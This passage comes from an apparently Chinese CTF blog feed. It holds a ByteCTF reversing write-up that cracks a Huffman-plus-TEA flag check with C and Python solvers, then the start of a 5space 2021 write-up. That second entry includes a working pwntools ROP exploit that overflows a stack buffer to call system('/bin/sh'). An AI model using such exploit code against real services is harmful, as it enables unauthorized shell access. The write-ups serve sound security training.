BYREF</span></span><br><span class="line">  __int64 v18; <span class="hljs-comment">// [rsp+A0h] [rbp-20h]</span></span><br><span class="line">  __int64 v19; <span class="hljs-comment">// [rsp+A8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">sub_4257A0</span>(input);</span><br><span class="line">  <span class="hljs-built_in">nullsub_7</span>(&amp;v15);</span><br><span class="line">  <span class="hljs-built_in">sub_427EC0</span>(answer, &amp;dword_536800, <span class="hljs-number">40LL</span>, &amp;v15); <span class="hljs-comment">//最终结果</span></span><br><span class="line">  <span class="hljs-built_in">nullsub_9</span>(&amp;v15);</span><br><span class="line">  v3 = <span class="hljs-built_in">sub_41F910</span>(&amp;stdout, <span class="hljs-string">"input:"</span>);</span><br><span class="line">  ((<span class="hljs-built_in"><span class="hljs-keyword">void</span></span> (__fastcall *)(__int64))sub_41F2C0)(v3);</span><br><span class="line">  <span class="hljs-built_in">sub_40BDC0</span>(&amp;stdin, input); <span class="hljs-comment">//输入</span></span><br><span class="line">  v4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">64LL</span>);</span><br><span class="line">  <span class="hljs-built_in">sub_4010A0</span>(v4);</span><br><span class="line">  v18 = v4;</span><br><span class="line">  v5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">64LL</span>);</span><br><span class="line">  <span class="hljs-built_in">sub_4010A0</span>(v5);</span><br><span class="line">  v19 = v5;</span><br><span class="line">  <span class="hljs-built_in">check_1</span>(input); <span class="hljs-comment">//检查以及初始化</span></span><br><span class="line">  (*(<span class="hljs-built_in"><span class="hljs-keyword">void</span></span> (__fastcall **)(<span class="hljs-keyword">char</span> *, __int64, <span class="hljs-keyword">char</span> *))(*(_QWORD *)v18 + <span class="hljs-number">8LL</span>))(v16, v18, input);</span><br><span class="line">  <span class="hljs-built_in">sub_404334</span>(v12, v16);</span><br><span class="line">  <span class="hljs-built_in">sub_403E24</span>(v16);</span><br><span class="line">  v6 = *(<span class="hljs-built_in"><span class="hljs-keyword">void</span></span> (__fastcall **)(<span class="hljs-keyword">char</span> *, __int64, __int64))(*(_QWORD *)v19 + <span class="hljs-number">8LL</span>);</span><br><span class="line">  v7 = <span class="hljs-built_in">sub_404EF6</span>(v12);</span><br><span class="line">  <span class="hljs-built_in">v6</span>(v17, v19, v7);</span><br><span class="line">  <span class="hljs-built_in">sub_404334</span>(v11, v17);</span><br><span class="line">  <span class="hljs-built_in">sub_403E24</span>(v17);</span><br><span class="line">  v8 = <span class="hljs-built_in">sub_404EF6</span>(v11);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int8)<span class="hljs-built_in">sub_404F07</span>(v8, answer) ) <span class="hljs-comment">//比较</span></span><br><span class="line">    v9 = <span class="hljs-built_in">sub_41F910</span>(&amp;stdout, <span class="hljs-string">"congrats!"</span>);</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">    v9 = <span class="hljs-built_in">sub_41F910</span>(&amp;stdout, <span class="hljs-string">"try again."</span>);</span><br><span class="line">  ((<span class="hljs-built_in"><span class="hljs-keyword">void</span></span> (__fastcall *)(__int64))sub_41F2C0)(v9);</span><br><span class="line">  <span class="hljs-built_in">sub_403E24</span>(v11);</span><br><span class="line">  <span class="hljs-built_in">sub_403E24</span>(v12);</span><br><span class="line">  <span class="hljs-built_in">sub_4258C0</span>(answer);</span><br><span class="line">  <span class="hljs-built_in">sub_4258C0</span>(input);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>0x4027D5处函数(check_1)先对输入进行了检查，要求长度为41且格式为<code>bytectf{*****}</code>。</p><img src="/2021/11/04/ByteCTF-re-moderncpp-%E9%A2%98%E8%A7%A3/moderncpp-1.png" alt="1" style="zoom:67%;"><p>接下来进行了部分初始化操作，输出了一句似乎没什么用的话，然后进行了编码操作。</p><p>第一步是在0x401414函数处生成字母表</p><img src="/2021/11/04/ByteCTF-re-moderncpp-%E9%A2%98%E8%A7%A3/moderncpp-2.png" style="zoom:67%;"><p>该处操作在内存中生成了一个字母表<code>abcdefghijklmnopqrstuvwxyz0123456789!@#%^&amp;*()_+-=[]{};</code>，接着在该函数中调用0x4018D6处函数，生成与字母表长度相同的一个整数数组，生成的规则如下：</p><img src="/2021/11/04/ByteCTF-re-moderncpp-%E9%A2%98%E8%A7%A3/moderncpp-3.png" style="zoom:67%;"><p>第二步在上述函数中调用0x401C86处函数，主要进行的操作就是将上面生成的两个进行一一对应的组合</p><img src="/2021/11/04/ByteCTF-re-moderncpp-%E9%A2%98%E8%A7%A3/moderncpp-4.png" style="zoom:67%;"><p>第三步是经过对数据的一些预处理操作之后，在sub_4015EE(gen_code)内对字母表中的字母进行编码</p><img src="/2021/11/04/ByteCTF-re-moderncpp-%E9%A2%98%E8%A7%A3/moderncpp-5.png" style="zoom:67%;"><p>很像一棵树，先添“0”，遍历左子树，然后添“1”，遍历右子树，很明显利用预先构造好的树对字符进行0-1编码。编码结束之后对输入进行处理。</p><p>第一步处理很简单，对输入进行逐字节编码，拼接在一起，然后8位一组转化为int。</p><img src="/2021/11/04/ByteCTF-re-moderncpp-%E9%A2%98%E8%A7%A3/moderncpp-6.png" style="zoom:67%;"><p>可以发现是高位在前，低位在后</p><img src="/2021/11/04/ByteCTF-re-moderncpp-%E9%A2%98%E8%A7%A3/moderncpp-7.png" style="zoom:67%;"><p>该部分经过多次调试可以发现，每一个字母为不等长0-1编码，且每次编码固定，如果不确定是什么编码方式的话也可以使用调试的方式，通过输入不同的字符来查找对应的编码。但实际上很容易想到这是Huffman编码。</p><p>后面的处理是加密，在0x4024A4处，根据特征值<code>0x9E3779B9</code>或者使用findcrypt插件可以很容易发现这是tea加密</p><img src="/2021/11/04/ByteCTF-re-moderncpp-%E9%A2%98%E8%A7%A3/moderncpp-8.png" style="zoom:67%;"><p>明文为刚刚进行编码过的数据，对该函数交叉引用很快就可以找到key</p><img src="/2021/11/04/ByteCTF-re-moderncpp-%E9%A2%98%E8%A7%A3/moderncpp-9.png" style="zoom:67%;"><p>继续回到main函数，加密的结果与最开始拷贝的0x536800处的40个字节进行对比，相同则正确。</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>先解密tea得到编码后的结果</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">decrypt</span><span class="hljs-params">(<span class="hljs-keyword">uint32_t</span> *v, <span class="hljs-keyword">uint32_t</span> *k)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">    <span class="hljs-keyword">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], sum = <span class="hljs-number">0xC6EF3720</span>, i;</span><br><span class="line">    <span class="hljs-keyword">uint32_t</span> delta = <span class="hljs-number">0x9e3779b9</span>;</span><br><span class="line">    <span class="hljs-keyword">uint32_t</span> k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];</span><br><span class="line">    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++)</span><br><span class="line">    {</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + k1);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    }</span><br><span class="line">    v[<span class="hljs-number">0</span>] = v0;</span><br><span class="line">    v[<span class="hljs-number">1</span>] = v1;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">    <span class="hljs-keyword">uint32_t</span> v[<span class="hljs-number">10</span>] = {<span class="hljs-number">0x0C5D3669F</span>, <span class="hljs-number">0x0B917171A</span>, <span class="hljs-number">0x0B4B37B19</span>, <span class="hljs-number">0x0AE80C5F</span>, <span class="hljs-number">0x8D80307F</span>, <span class="hljs-number">0x21522880</span>, <span class="hljs-number">0x34D80589</span>, <span class="hljs-number">0x0DE6C83D1</span>, <span class="hljs-number">0x59B73618</span>, <span class="hljs-number">0x0C6E65D35</span>}, k[<span class="hljs-number">4</span>] = {<span class="hljs-number">0x62797465</span>, <span class="hljs-number">0x2D637466</span>, <span class="hljs-number">0x77656C63</span>, <span class="hljs-number">0x6F6D657E</span>};</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="hljs-keyword">uint32_t</span> tmp_v[]={v[<span class="hljs-number">2</span>*i],v[<span class="hljs-number">2</span>*i+<span class="hljs-number">1</span>]};</span><br><span class="line">        <span class="hljs-built_in">decrypt</span>(tmp_v, k);</span><br><span class="line">        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%x,%x,"</span>, tmp_v[<span class="hljs-number">0</span>], tmp_v[<span class="hljs-number">1</span>]);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">// d869f00c,62fb324a,ccca48e,e56322c0,5e07fdb6,8dc6fee6,ad518dfd,14fa68e4,78</span></span><br></pre></td></tr></tbody></table></figure><p>按照小端序转换为字节后，继续转换为8位二进制字符串拼接，从头开始向后遍历，在表中找到对应的字母后调整开头位置，继续向后遍历，Huffman编码保证了这样做结果的唯一性。字母表使用Huffman编码的方式生成会更快，但是手动调试出来对于程序分析的难度会较低，是个比较讨巧的办法。</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Node</span>():</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, name=<span class="hljs-literal">None</span>, value=<span class="hljs-literal">None</span></span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.value = value</span><br><span class="line">        self.right = <span class="hljs-literal">None</span></span><br><span class="line">        self.left = <span class="hljs-literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HuffmanTree</span>():</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, arr</span>):</span></span><br><span class="line">        self.charset = {}</span><br><span class="line">        self.nodes = [Node(values[<span class="hljs-number">0</span>], values[<span class="hljs-number">1</span>])</span><br><span class="line">                      <span class="hljs-keyword">for</span> values <span class="hljs-keyword">in</span> arr]</span><br><span class="line">        <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(self.nodes) != <span class="hljs-number">1</span>:</span><br><span class="line">            self.nodes.sort(key=<span class="hljs-keyword">lambda</span> node: node.value)</span><br><span class="line">            p = Node(value=(self.nodes[<span class="hljs-number">0</span>].value +</span><br><span class="line">                     self.nodes[<span class="hljs-number">1</span>].value))</span><br><span class="line">            p.left = self.nodes.pop(<span class="hljs-number">0</span>)</span><br><span class="line">            p.right = self.nodes.pop(<span class="hljs-number">0</span>)</span><br><span class="line">            self.nodes.append(p)</span><br><span class="line">        self.root = self.nodes[<span class="hljs-number">0</span>]</span><br><span class="line"></span><br><span class="line">        self.Code = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">60</span>))</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">HuffmanCode</span>(<span class="hljs-params">self, tree, length</span>):</span></span><br><span class="line">        node = tree</span><br><span class="line">        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> node):</span><br><span class="line">            <span class="hljs-keyword">return</span></span><br><span class="line">        <span class="hljs-keyword">elif</span> node.name:</span><br><span class="line">            result = <span class="hljs-string">''</span></span><br><span class="line">            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):</span><br><span class="line">                result += <span class="hljs-built_in">str</span>(self.Code[i])</span><br><span class="line">            self.charset[node.name] = result</span><br><span class="line">            <span class="hljs-keyword">return</span></span><br><span class="line">        self.Code[length] = <span class="hljs-number">0</span></span><br><span class="line">        self.HuffmanCode(tree.left, length + <span class="hljs-number">1</span>)</span><br><span class="line">        self.Code[length] = <span class="hljs-number">1</span></span><br><span class="line">        self.HuffmanCode(tree.right, length+<span class="hljs-number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">GenCode</span>(<span class="hljs-params">self</span>):</span></span><br><span class="line">        self.HuffmanCode(self.root, <span class="hljs-number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">alphabet = <span class="hljs-string">'abcdefghijklmnopqrstuvwxyz0123456789!@#%^&amp;*()_+-=[]{};'</span></span><br><span class="line">arr = []</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">54</span>):</span><br><span class="line">    arr.append((<span class="hljs-number">43</span>*(<span class="hljs-number">127</span>+i)) % <span class="hljs-number">233</span>)</span><br><span class="line">char_weights = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">zip</span>(alphabet, arr))</span><br><span class="line">tree = HuffmanTree(char_weights)</span><br><span class="line">tree.GenCode()</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># check</span></span><br><span class="line">charset = {</span><br><span class="line">    <span class="hljs-string">'b'</span>: <span class="hljs-string">'00001'</span>,</span><br><span class="line">    <span class="hljs-string">'y'</span>: <span class="hljs-string">'10011'</span>,</span><br><span class="line">    <span class="hljs-string">'t'</span>: <span class="hljs-string">'11000'</span>,</span><br><span class="line">    <span class="hljs-string">'e'</span>: <span class="hljs-string">'0011010'</span>,</span><br><span class="line">    <span class="hljs-string">'c'</span>: <span class="hljs-string">'01110'</span>,</span><br><span class="line">    <span class="hljs-string">'f'</span>: <span class="hljs-string">'010010'</span>,</span><br><span class="line">    <span class="hljs-string">'{'</span>: <span class="hljs-string">'10001'</span>,</span><br><span class="line">    <span class="hljs-string">'a'</span>: <span class="hljs-string">'100101'</span>,</span><br><span class="line">    <span class="hljs-string">'d'</span>: <span class="hljs-string">'11011'</span>,</span><br><span class="line">    <span class="hljs-string">'g'</span>: <span class="hljs-string">'111011'</span>,</span><br><span class="line">    <span class="hljs-string">'h'</span>: <span class="hljs-string">'01000'</span>,</span><br><span class="line">    <span class="hljs-string">'i'</span>: <span class="hljs-string">'10110'</span>,</span><br><span class="line">    <span class="hljs-string">'j'</span>: <span class="hljs-string">'00110111'</span>,</span><br><span class="line">    <span class="hljs-string">'k'</span>: <span class="hljs-string">'1111010'</span>,</span><br><span class="line">    <span class="hljs-string">'l'</span>: <span class="hljs-string">'110010'</span>,</span><br><span class="line">    <span class="hljs-string">'m'</span>: <span class="hljs-string">'00011'</span>,</span><br><span class="line">    <span class="hljs-string">'n'</span>: <span class="hljs-string">'10000'</span>,</span><br><span class="line">    <span class="hljs-string">'o'</span>: <span class="hljs-string">'10100011101'</span>,</span><br><span class="line">    <span class="hljs-string">'p'</span>: <span class="hljs-string">'0110011'</span>,</span><br><span class="line">    <span class="hljs-string">'q'</span>: <span class="hljs-string">'011000'</span>,</span><br><span class="line">    <span class="hljs-string">'r'</span>: <span class="hljs-string">'111110'</span>,</span><br><span class="line">    <span class="hljs-string">'s'</span>: <span class="hljs-string">'01011'</span>,</span><br><span class="line">    <span class="hljs-string">'u'</span>: <span class="hljs-string">'11110110'</span>,</span><br><span class="line">    <span class="hljs-string">'v'</span>: <span class="hljs-string">'000001'</span>,</span><br><span class="line">    <span class="hljs-string">'w'</span>: <span class="hljs-string">'111000'</span>,</span><br><span class="line">    <span class="hljs-string">'x'</span>: <span class="hljs-string">'00101'</span>,</span><br><span class="line">    <span class="hljs-string">'z'</span>: <span class="hljs-string">'101000110'</span>,</span><br><span class="line">    <span class="hljs-string">'0'</span>: <span class="hljs-string">'1110010'</span>,</span><br><span class="line">    <span class="hljs-string">'1'</span>: <span class="hljs-string">'100100'</span>,</span><br><span class="line">    <span class="hljs-string">'2'</span>: <span class="hljs-string">'111111'</span>,</span><br><span class="line">    <span class="hljs-string">'3'</span>: <span class="hljs-string">'01101'</span>,</span><br><span class="line">    <span class="hljs-string">'4'</span>: <span class="hljs-string">'11010'</span>,</span><br><span class="line">    <span class="hljs-string">'5'</span>: <span class="hljs-string">'11110111'</span>,</span><br><span class="line">    <span class="hljs-string">'}'</span>: <span class="hljs-string">'1010001111'</span>,</span><br><span class="line">    <span class="hljs-string">'6'</span>: <span class="hljs-string">'001100'</span>,</span><br><span class="line">    <span class="hljs-string">'7'</span>: <span class="hljs-string">'111010'</span>,</span><br><span class="line">    <span class="hljs-string">'8'</span>: <span class="hljs-string">'00111'</span>,</span><br><span class="line">    <span class="hljs-string">'9'</span>: <span class="hljs-string">'10101'</span>,</span><br><span class="line">    <span class="hljs-string">'!'</span>: <span class="hljs-string">'00110110'</span>,</span><br><span class="line">    <span class="hljs-string">'@'</span>: <span class="hljs-string">'1110011'</span>,</span><br><span class="line">    <span class="hljs-string">'#'</span>: <span class="hljs-string">'101001'</span>,</span><br><span class="line">    <span class="hljs-string">'%'</span>: <span class="hljs-string">'00010'</span>,</span><br><span class="line">    <span class="hljs-string">'^'</span>: <span class="hljs-string">'01111'</span>,</span><br><span class="line">    <span class="hljs-string">'&amp;'</span>: <span class="hljs-string">'10100011100'</span>,</span><br><span class="line">    <span class="hljs-string">'*'</span>: <span class="hljs-string">'0110010'</span>,</span><br><span class="line">    <span class="hljs-string">'('</span>: <span class="hljs-string">'010011'</span>,</span><br><span class="line">    <span class="hljs-string">')'</span>: <span class="hljs-string">'111100'</span>,</span><br><span class="line">    <span class="hljs-string">'_'</span>: <span class="hljs-string">'01010'</span>,</span><br><span class="line">    <span class="hljs-string">'+'</span>: <span class="hljs-string">'10111'</span>,</span><br><span class="line">    <span class="hljs-string">'-'</span>: <span class="hljs-string">'10100010'</span>,</span><br><span class="line">    <span class="hljs-string">'='</span>: <span class="hljs-string">'000000'</span>,</span><br><span class="line">    <span class="hljs-string">'['</span>: <span class="hljs-string">'110011'</span>,</span><br><span class="line">    <span class="hljs-string">']'</span>: <span class="hljs-string">'00100'</span>,</span><br><span class="line">    <span class="hljs-string">';'</span>: <span class="hljs-string">'1010000'</span></span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">assert</span>(charset == tree.charset)</span><br><span class="line"></span><br><span class="line">new_dic = <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">zip</span>(tree.charset.values(), tree.charset.keys()))</span><br><span class="line"><span class="hljs-comment"># d869f00c,62fb324a,ccca48e,e56322c0,5e07fdb6,8dc6fee6,ad518dfd,14fa68e4,78</span></span><br><span class="line">target = [<span class="hljs-number">0x0c</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x63</span>,</span><br><span class="line">          <span class="hljs-number">0xe5</span>, <span class="hljs-number">0xb6</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0x68</span>,</span><br><span class="line">          <span class="hljs-number">0xfa</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x78</span>]</span><br><span class="line">f = <span class="hljs-string">''</span>.join([<span class="hljs-built_in">bin</span>(i)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">8</span>, <span class="hljs-string">'0'</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> target])</span><br><span class="line"></span><br><span class="line">i = <span class="hljs-number">0</span></span><br><span class="line">j = <span class="hljs-number">5</span></span><br><span class="line"><span class="hljs-keyword">while</span> j &lt; <span class="hljs-built_in">len</span>(f):</span><br><span class="line">    tmp = f[i:j]</span><br><span class="line">    <span class="hljs-keyword">if</span> new_dic.get(tmp):</span><br><span class="line">        <span class="hljs-built_in">print</span>(new_dic[tmp], end=<span class="hljs-string">''</span>)</span><br><span class="line">        i = j</span><br><span class="line">        j += <span class="hljs-number">5</span></span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        j += <span class="hljs-number">1</span></span><br></pre></td></tr></tbody></table></figure><p>需要注意的是这里生成Huffman编码的时候，相同数值使用不同的排序算法可能会有不同的顺序，例如使用python的sort算法时，倒序的方式生成的编码与题目中生成的不同，有可能需要多尝试几次。</p></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> ByteCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wp-5space-2021</title>
      <link href="/2021/10/05/wp-5space-2021/"/>
      <url>/2021/10/05/wp-5space-2021/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>第五空间2021，忙完之后终于有时间梳理一下之前做题的思路和复现一下当时没有解出来的题目。</p><span id="more"></span><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="bountyhunter"><a href="#bountyhunter" class="headerlink" title="bountyhunter"></a>bountyhunter</h3><p>基础栈溢出</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">vulnerable_function</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">144</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-90h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">system</span>(<span class="hljs-string">"echo Who are you? What do you want?"</span>);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x200</span>uLL);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>存在溢出，程序中包含<code>/bin/sh</code>字符串，rop</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="hljs-string">'./pwn'</span>)</span><br><span class="line"><span class="hljs-comment"># p = remote('139.9.123.168', 32548)</span></span><br><span class="line">binary = ELF(<span class="hljs-string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># def debug():</span></span><br><span class="line"><span class="hljs-comment">#     log.info("pid: %d" % util.proc.pidof(p)[0])</span></span><br><span class="line"><span class="hljs-comment">#     pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># debug()</span></span><br><span class="line">bin_sh = <span class="hljs-number">0x403408</span></span><br><span class="line">system = binary.plt.system</span><br><span class="line">log.info(<span class="hljs-built_in">hex</span>(system))</span><br><span class="line">ret = <span class="hljs-number">0x401016</span></span><br><span class="line">pop_rdi = <span class="hljs-number">0x40120b</span></span><br><span class="line">payload = <span class="hljs-string">b'a'</span>*(<span class="hljs-number">0x90</span>+<span class="hljs-number">8</span>)+p64(ret) + p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="StrangeLanguage"><a href="#StrangeLanguage" class="headerlink" title="StrangeLanguage"></a>StrangeLanguage</h3><p>拿到的程序为pyinstaller打包，首先解包</p><h4 id="解包"><a href="#解包" class="headerlink" 